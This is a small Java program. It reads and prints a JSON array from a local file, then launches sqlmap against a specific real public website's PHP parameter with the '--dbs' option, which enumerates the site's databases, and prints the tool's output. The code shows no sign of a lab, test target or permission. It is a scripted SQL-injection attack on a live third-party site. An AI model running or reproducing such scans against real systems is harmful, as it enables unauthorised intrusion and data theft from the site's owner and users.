package com.company;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

import org.json.*;


public class Main {

    public static void main(String[] args) throws IOException {

            // TODO Auto-generated method stub
            BufferedReader reader = new BufferedReader(new FileReader("text.txt"));
            String jsonStr = "";
            try {
                StringBuilder sb = new StringBuilder();
                String line = reader.readLine();

                while (line != null) {
                    sb.append(line);
                    sb.append("\n");
                    line = reader.readLine();
                }
                jsonStr = sb.toString();
            } finally {
                reader.close();
            }
            JSONArray jsonArr = new JSONArray(jsonStr);

            for (int i = 0; i < jsonArr.length(); i++)
            {
                JSONObject jsonObj = jsonArr.getJSONObject(i);

                System.out.println(jsonObj);
            }
        ProcessBuilder processBuilder = new ProcessBuilder();
        // Windows
        processBuilder.command("sqlmap", "-u", "http://www.bible-history.com/subcat.php?id=2","--dbs");

        try {

            Process process = processBuilder.start();

            BufferedReader readerTwo =
                    new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = readerTwo.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();
            System.out.println("\nExited with error code : " + exitCode);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        }
    }

